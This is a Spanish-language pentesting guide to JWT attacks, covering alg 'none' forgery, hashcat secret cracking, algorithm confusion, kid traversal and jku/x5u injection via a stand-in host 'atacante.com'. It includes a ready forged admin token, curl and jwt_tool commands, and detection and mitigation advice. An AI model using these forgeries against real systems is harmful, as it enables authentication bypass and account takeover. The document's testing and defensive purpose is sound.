# JWT: Ataques y Validaciones

## Resumen

**Qué es:** JSON Web Token (JWT) es un estándar para transferir claims entre dos partes de forma segura y compacta, ampliamente usado en autenticación/autorización web.
**Por qué importa:** Un JWT mal implementado puede permitir autenticación indebida, escalado de privilegios y toma de control de cuentas.
**Cuándo aplicarlo:** Relevante en pentests y bug bounty donde el sistema usa JWT para sesiones, API, OAuth2, SSO o autorización de recursos.

---

## Contexto

**Supuestos:**

- La aplicación utiliza JWT para sesiones o API, transmitidos por header `Authorization` o cookies (frecuentemente con `Bearer`).
- Permiso para interceptar, modificar y retransmitir solicitudes (Burp Suite, DevTools, Curl).
- Se cuenta con acceso a herramientas para decodificar y editar JWT (jwt.io, jwt-tool, CyberChef).
- Pruebas realizadas sobre apps en Node.js, Python, Java, Go, con librerías comunes (`jsonwebtoken`, `PyJWT`, `jjwt`).
- El entorno permite explotación sin mecanismos adicionales de protección (p.ej. WAF restringido).

**Límites:**

- Excluye tokens SAML u OAuth sin JWT.
- Foco en pruebas black/grey box.

---

## Metodología

1. **Identificación:** Localiza el JWT en tráfico (header/cookie/param) y verifica su uso en la autenticación.
2. **Decodificación:** Analiza el contenido con herramientas como jwt.io:
   - Header: `alg`, `typ`, `kid`, `jwk`, `jku`, `x5u`.
   - Payload: claims (`sub`, `role`, `exp`, `iat`, `nbf`, `aud`, `iss`).
3. **Validación de firma:** Manipula la firma y payload, observa si la aplicación lo rechaza o acepta.
4. **Pruebas manuales:**
   - Modifica el campo `alg` a `none` y elimina la firma.
   - Cambia el payload (`role`, `sub`, `username`).
   - Modifica cabeceras sensibles como `kid`, `jwk`, `jku`, `x5u`.
5. **Ataques de fuerza bruta:** Trata de descubrir el secreto de firma si se usa HS256/HS512 y la clave es débil.
6. **Validaciones de claims:** Verifica manejo de exp, nbf, iat, aud, iss y revocación.
7. **Explotación de variantes:** Algoritmo confusion, injection de claves, SSRF/JWK/jku/x5u, path traversal en `kid`.
8. **Observa logs, respuestas del backend, diferencias de permisos, errores y side-channels (timming, mensajes de error).**

**Checklist de verificación**

- El algoritmo de firma es seguro y restringido.
- La clave privada/secreta no es trivial ni reutilizada.
- Firma obligatoria y correctamente verificada.
- No se permite `none`, ni variantes de capitalización.
- El claim `exp` es obligatorio y el manejo de expiración es efectivo.
- Validación robusta de claims críticos (`aud`, `iss`) según contexto.
- No existen parámetros header manipulables (`jwk`, `kid`, `jku`, `x5u`) sin whitelisting.

---

## Pruebas Manuales

### Herramientas

- **Burp Suite + JWT Editor**
- **jwt.io, jwt-tool, CyberChef**
- **Curl, DevTools del navegador**

### Proceso manual reproducible

1. **Extraer y analizar el JWT**
   - Usa Burp o DevTools para capturar la petición con el JWT.
   - Pega el token en jwt.io y revisa contents y algoritmo.
2. **Ataque “none”**
   - Modifica el header a:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

- Elimina la firma (`<header>.<payload>.`).
- Reenvía la petición. Si el backend acepta el token, es crítico.

3. **Fuerza bruta del secreto**
   - Identifica si usa HS256/HS512.
   - Utiliza una wordlist (`SecLists`, `rockyou.txt`) y hashcat:

```
hashcat -a 0 -m 16500 <jwt> <wordlist>
```

- Si obtienes el secreto, genera un JWT con claim modificado (por ejemplo, role: `admin`) y firma propia.

4. **Algorithm confusion**
   - Si la app usa RS256, modifica el header a “HS256”.
   - Firma el JWT usando la clave pública conocida.
   - Si la app valida el token, has explotado el algoritmo confusion.
5. **kid path traversal/SSTI/SQLi**
   - Modifica `kid` en header:

```json
{ ..., "kid": "../../../../../../dev/null", ... }
```

- Firma el JWT con una string vacía. Si el sistema valida, confirma path traversal.
- Intenta inyección SQL si el valor del `kid` es usado en consultas.

6. **jwk/jku/x5u injection**
   - Agrega `jwk` en header firmado por clave privada propia.
   - Establece `jku` o `x5u` a `https://atacante.com/jwks.json` y publica la key pública coincidente.
   - Firma el token con tu clave y revisa si el backend lo acepta.

**Ejemplo PoC manual**
Para “none”:

```
Header: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
Payload: eyJ1c2VyIjoidmljdGltYS5jb20iLCJyb2xlIjoiYWRtaW4ifQ
JWT: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidmljdGltYS5jb20iLCJyb2xlIjoiYWRtaW4ifQ.
```

Envía con curl:

```
curl -H "Authorization: Bearer <jwt>" https://victima.com/api/privado
```

---

## PoC Automatizada

**Automatización con jwt-tool (Python):**

```bash
jwt_tool attacker.com.jwt -I -p 'role=admin' -S 'none'
jwt_tool attacker.com.jwt -C -w ~/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

**Automatización con Burp Suite:**

- Usa Intruder para automatizar fuerza bruta de claves.
- Usa macros para automatizar reenvíos con headers manipulados.

---

## Explotación y Automatización

### Variantes y bypass

- **Race Condition:** Automatiza ataques concurrentes reusando tokens si la app es vulnerable.
- **Cambio de algoritmo:** Cambia entre RS256/HS256 para confusión si la implementación acepta ambos.
- **Inyección JWK/JKU/X5U:** Utiliza un JWKS público hospedado en atacante.com.
- **kid traversal:** Prueba rutas inusuales o archivos accesibles en la máquina víctima.

**Ejemplo script útil:**

```python
import jwt
token = jwt.encode({'user': 'admin'}, '', algorithm='none')
print(token)
```

---

## Impacto

**Escenario:**

- Acceso a recursos de otros usuarios, elevación de privilegios, bypass completo de autenticación.

**Mapeo OWASP/CWE:**

- A2:2021 Broken Authentication, A4:2021 Insecure Design.
- CWE-287, CWE-347.

**Severidad:**

- CVSS Base ≥8.1 si implica bypass de autenticación.[^2]

---

## Detección

**Qué loggear:**

- Rechazo de tokens inválidos (firma incorrecta, algoritmo no permitido).
- Excesivos fallos en validación y reintentos (indicativo de fuerza bruta).
- Cambios o uso inusual de claims y headers (`none`, `jwk`, `kid` sospechosos).
- Peticiones a endpoints JWKS/JKU/X5U ajenos al dominio.

**Dónde loggear:**

- App: registros de errores de autenticación, claims sospechosos.
- WAF/CDN: anomalías en tamaño/tipología de JWT, rutas inusuales (SSRF).
- EDR: comportamientos inusuales al manipular archivos (path traversal).

---

## Mitigación

- **Deshabilitar el algoritmo “none”** y variantes (case-insensitive).
- **No utilizar claves débiles ni predeterminadas** ("secret", "password").
- **Lista blanca estricta de algoritmos admitidos**.
- **Validar y restringir claims críticos** (`exp`, `nbf`, `iat`, `aud`, `iss`).
- **No aceptar parámetros manipulables en header** (`jwk`, `jku`, `x5u`, `kid` sin validación dura).
- **Implementación de expiración y revocación de tokens.**
- **Revisión y pruebas post-parche:** fuerza bruta, algoritmo confusion, injections.

---

## Errores comunes

- Falso positivo: header “alg” none pero el backend lo rechaza correctamente.
- Falsos negativos: creer que verificar solo la firma es suficiente, sin revisar claims ni keyIDs.
- Asumir que otros microservicios/autenticadores validan igual que la lógica principal.

---

## Reporte

**Título:** Bypass de autenticación/privilegio mediante manipulación de JWT.
**Impacto:** Bypass completo de controles de autenticación para cualquier usuario/rol.
**Pasos:**

1. Interceptar JWT emitido.
2. Modificar header a alg “none” y/o manipular claim role/sub.
3. Resomitir token forjado.
4. Acceso concedido como otro usuario o admin.
   **Evidencias:**

- Token JWT modificado y respuesta positiva del recurso.
- Logs de acceso y ausencia de rechazo a tokens alterados.
  **Mitigación:**
- Forzado de lista blanca de algoritmos y validación estricta de claims/headers.
  **Referencias:**
- RFC 7519, JWT Best Practices (OWASP, PortSwigger, Vaadata, PentesterLab)[^1]


[^1]: https://www.vaadata.com/blog/jwt-json-web-token-vulnerabilities-common-attacks-and-security-best-practices/
    
[^2]: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection
    
[^3]: https://pentestkit.co.uk/jwt.html
    
[^4]: https://nvd.nist.gov/vuln/detail/CVE-2024-54150
    
[^5]: https://pentesterlab.com/blog/another-jwt-algorithm-confusion-cve-2024-54150
    
[^6]: https://www.traceable.ai/blog-post/jwts-under-the-microscope-how-attackers-exploit-authentication-and-authorization-weaknesses
    
[^7]: https://hakaisecurity.io/the-dark-side-of-jwt-exploiting-token-vulnerabilities/research-blog/
    
[^8]: https://probely.com/vulnerabilities/jwt-accepting-none-algorithm/
    
[^9]: https://blog.nashtechglobal.com/abusing-jwts-signature-bypass-none-algorithm-key-confusion/
    
[^10]: https://www.vicarius.io/vsociety/posts/jwt-bomb-in-python-jose-cve-2024-33664
    
[^11]: https://www.acunetix.com/blog/articles/json-web-token-jwt-attacks-vulnerabilities/
    
[^12]: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key
    
[^13]: https://www.clear-gate.com/blog/cracking-jwt-vulnerabilities/
    
[^14]: https://portswigger.net/kb/issues/00200901_jwt-none-algorithm-supported
    
[^15]: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification
    
[^16]: https://nvd.nist.gov/vuln/detail/CVE-2024-50634
    
[^17]: https://pentesterlab.com/blog/jwt-vulnerabilities-attacks-guide
    
[^18]: https://www.acunetix.com/vulnerabilities/web/jwt-signature-bypass-via-unvalidated-jwk-parameter/
    
[^19]: https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/jwt-signature-bypass-via-none-algorithm/
    
[^20]: https://docs.prismacloud.io/en/enterprise-edition/policy-reference/sast-policies/javascript-policies/sast-policy-181
    
[^21]: https://docs.datadoghq.com/security/code_security/static_analysis/static_analysis_rules/kotlin-security/secure-jwt-algorithm/
    
[^22]: https://books.spartan-cybersec.com/web/jwt/lab-2-jwt-authentication-bypass-via-flawed-signature-verification
    
[^23]: https://auth0.com/blog/brute-forcing-hs256-is-possible-the-importance-of-using-strong-keys-to-sign-jwts/
    
[^24]: https://github.com/timhudson/jwt-secret
    
[^25]: https://vulnapi.cerberauth.com/docs/vulnerabilities/broken-authentication/jwt-weak-secret
    
[^26]: https://www.invicti.com/web-application-vulnerabilities/jwt-signature-bypass-via-kid-sql-injection
    
[^27]: https://www.acunetix.com/vulnerabilities/web/unvalidated-jwt-x5u-parameter/
    
[^28]: https://www.startupdefense.io/cyberattacks/jwt-brute-forcing
    
[^29]: https://www.acunetix.com/vulnerabilities/web/jwt-signature-bypass-via-kid-sql-injection/
    
[^30]: https://github.com/ticarpi/jwt_tool/wiki/Known-Exploits-and-Attacks
    
[^31]: https://www.linkedin.com/pulse/cracking-jwt-vulnerabilities-clear-gate-os3yf
    
[^32]: https://pentesterlab.com/exercises/jwt_iii
    
[^33]: https://www.invicti.com/web-application-vulnerabilities/jwt-signature-bypass-via-unvalidated-jku-parameter
    
[^34]: https://lab.wallarm.com/340-weak-jwt-secrets-you-should-check-in-your-code/
    
[^35]: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal
    
[^36]: http://www.diva-portal.org/smash/get/diva2:1951665/FULLTEXT01.pdf
    
[^37]: https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/jwt-kid-parameter-out-of-band-command-injection/
    
[^38]: https://portswigger.net/web-security/jwt
    
[^39]: https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/jwt-forgery-via-unvalidated-jku-parameter/
    
[^40]: https://siunam321.github.io/ctf/portswigger-labs/JWT/jwt-6/
    
[^41]: https://mojoauth.com/blog/understanding-jwt-nbf-not-before-in-authentication-why-timing-matters
    
[^42]: https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/jwt-forgery-via-path-traversal/
    
[^43]: https://datatracker.ietf.org/doc/html/rfc7519
    
[^44]: https://connect2id.com/products/nimbus-jose-jwt/examples/jwk-exp-nbf-iat
    
[^45]: https://www.youtube.com/watch?v=78FIFrOi4Os
    
[^46]: https://stackoverflow.com/questions/39926104/what-format-is-the-exp-expiration-time-claim-in-a-jwt
    
[^47]: https://trustedsec.com/blog/attacking-jwt-with-self-signed-claims
    
[^48]: https://pentesterlab.com/videos/jwt-iii-introduction
    
[^49]: https://curity.io/resources/learn/jwt-best-practices/
